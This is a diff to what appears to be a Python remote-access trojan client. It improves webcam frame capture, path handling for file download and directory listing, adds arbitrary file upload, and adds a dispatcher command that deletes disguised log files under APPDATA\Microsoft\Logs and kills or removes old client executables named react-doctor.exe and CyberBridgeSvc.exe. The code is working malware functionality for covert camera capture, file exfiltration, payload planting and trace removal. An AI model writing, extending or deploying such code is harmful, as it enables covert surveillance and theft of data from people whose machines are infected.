@@ -286,9 +286,11 @@ def _get_camera_frame() -> str:
     if not _CV2_AVAILABLE:
         return ""
     try:
-        cap = cv2.VideoCapture(0)
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
         if not cap.isOpened():
+            cap.release()
             return ""
+        time.sleep(0.2)
         ret, frame = cap.read()
         cap.release()
         if not ret:
@@ -429,9 +431,10 @@ def _stop_audio_record() -> str:
 
 def _download_file(path: str) -> str:
     try:
-        if not os.path.exists(path):
+        norm_path = os.path.normpath(path.replace("/", os.sep))
+        if not os.path.exists(norm_path):
             return ""
-        with open(path, "rb") as f:
+        with open(norm_path, "rb") as f:
             data = f.read()
         return base64.b64encode(data).decode()
     except Exception as e:
@@ -439,10 +442,26 @@ def _download_file(path: str) -> str:
         return ""
 
 
+def _upload_file(path: str, data_b64: str) -> bool:
+    try:
+        norm_path = os.path.normpath(path.replace("/", os.sep))
+        data = base64.b64decode(data_b64)
+        d = os.path.dirname(norm_path)
+        if d and not os.path.exists(d):
+            os.makedirs(d, exist_ok=True)
+        with open(norm_path, "wb") as f:
+            f.write(data)
+        return True
+    except Exception as e:
+        logger.error(f"Upload failed: {e}")
+        return False
+
+
 def _list_directory(path: str) -> list:
     try:
+        norm_path = os.path.normpath(path.replace("/", os.sep))
         entries = []
-        for entry in os.scandir(path):
+        for entry in os.scandir(norm_path):
             try:
                 entries.append({
                     "name":     entry.name,
@@ -455,6 +474,55 @@ def _list_directory(path: str) -> list:
         return entries
     except Exception as e:
         return [{"error": str(e)}]
+
+
+def _cleanup_old_client() -> dict:
+    removed = []
+    errors = []
+    try:
+        log_dir = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Microsoft", "Logs")
+        for fname in ["wsh.log", "cbsvc.log", "cbid.dat"]:
+            fpath = os.path.join(log_dir, fname)
+            try:
+                if os.path.exists(fpath):
+                    os.remove(fpath)
+                    removed.append(fpath)
+            except Exception as e:
+                errors.append(f"{fpath}: {e}")
+        # Kill old client processes
+        try:
+            import psutil
+            killed = []
+            for proc in psutil.process_iter(['name', 'exe']):
+                try:
+                    name = proc.info.get('name', '').lower()
+                    exe = (proc.info.get('exe') or '').lower()
+                    if name in ('react-doctor.exe', 'cyberbridgesvc.exe') or 'react-doctor' in exe or 'cyberbridge' in exe:
+                        if proc.pid != os.getpid():
+                            proc.kill()
+                            killed.append(name or exe)
+                except Exception:
+                    pass
+            if killed:
+                removed.append(f"killed processes: {killed}")
+        except Exception as e:
+            errors.append(f"process kill: {e}")
+        # Try to remove old executable in same dir as current process
+        try:
+            exe_dir = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
+            for name in ["react-doctor.exe", "CyberBridgeSvc.exe"]:
+                p = os.path.join(exe_dir, name)
+                if os.path.exists(p):
+                    try:
+                        os.remove(p)
+                        removed.append(p)
+                    except Exception:
+                        pass
+        except Exception as e:
+            errors.append(f"exe cleanup: {e}")
+    except Exception as e:
+        errors.append(str(e))
+    return {"removed": removed, "errors": errors}
 
 
 # ─── Command dispatcher ───────────────────────────────────────────────────────
@@ -496,6 +564,8 @@ def _dispatch(cmd: dict) -> dict:
                 payload.get("path", ""),
                 payload.get("data", ""),
             )}
+        elif cmd_type == "cleanup_old_client":
+            return {"value": _cleanup_old_client()}
         else:
             return {"error": f"Unknown command: {cmd_type}"}
     except Exception as e:
